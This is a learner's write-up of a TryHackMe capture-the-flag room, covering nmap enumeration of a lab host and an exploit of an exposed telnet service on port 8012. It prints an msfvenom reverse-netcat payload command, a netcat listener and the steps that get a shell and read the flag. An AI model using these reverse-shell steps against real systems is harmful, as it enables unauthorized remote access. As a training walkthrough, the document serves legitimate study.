![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/f979b8e5-5f41-42d5-8bf0-a02f863ecc8c)![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/102683de-0cb6-454e-87cd-c3479e87a596)# Documentation: TryHackMe Cyber Defense #02

## 1. Introduction
- **Purpose**: Document my experience and share knowledge on the Cyber Defense challenges
- **Scope**:  Learn the fundamental components of detecting and responding to threats in a corporate environment

## 2. Setup
- **Environment**: Kali Linux via VirtualBox
- **Accounts and Access**: Created a TryHackMe account and accessed the room via OpenVPN

## 3. Challenge Walkthrough

### 3.1 Room Name: Network Services
- **Objective**: Access target's assets by exploiting vulnerable services to exfiltrate valuable data

### 3.2 Enumeration
- **Initial Scanning**:
  - **Tools and Commands**:
    - Port Scanning:
    	- `nmap -A 10.10.177.199`
         - Shows that top 1000 ports are not open
       ![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/26a37547-6cf4-4d6c-9011-fb3af482edcd)
      - `nmap -A -p 8000-9000 10.10.177.199` -vv
         - Scanned ports between 8000-9000 and discovered an open port 8012/tcp
       ![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/4ce2baa3-4768-4b60-8d4b-9ac6d15922f9)

  - **Findings**:
	The open port is 8012
    	A possible username might be Skidy
        - Service might be a backdoor 

### 3.3 Exploitation
- **Vulnerability Identification**: Telnet vulnerability
  - **Techniques Used**:  Exploit using netcat reverse shell payload in the telnet server

- **Exploitation Process**:
  
- Enter `telnet 10.10.177.199 8012`  now you can connect to the telnet server using the discovered port 8012
   	
![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/e6bcd72f-8053-46dc-837c-6ca396e0d149)

- Enter `msfvenom -p cmd/unix/reverse_netcat lhost=10.17.64.194 lport=4444 R` to generate a reverse shell payload using msfvenom
	  
![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/56f3c19c-bd00-4d59-98f6-7f47da11b424)

- Enter `nc -lvp 4444` to start netcat lister to listen for inbound connection and see data
![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/cef1919e-40fc-4e27-b83b-7e1cbd3e0f18)

- Copy the payload into the telnet server CLI and press enter
![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/09af501b-3792-4d1d-9fa7-0dc51f9f299d)

- Go to the netcat lister and enter `ls` it will show the file flag.txt
![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/bad9f0bf-77d9-4770-90d3-5240f7384d8a)

- Enter `cat flag.txt` to capture the flag
![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/d4896955-1e10-4cb3-9576-65c33d4684c5)


## 4. Analysis and Reflection
- **Challenges Faced**: Difficulty in identifying the exact version of Apache.
- **Learnings**: Importance of thorough enumeration.
- **Improvements**: Try alternative enumeration techniques earlier.

## 5. Conclusion
- **Summary**: Successfully gained root access and captured the flag

## 6. References
- [TryHackMe](https://tryhackme.com)
- [Nmap Documentation](https://nmap.org/book/man.html)

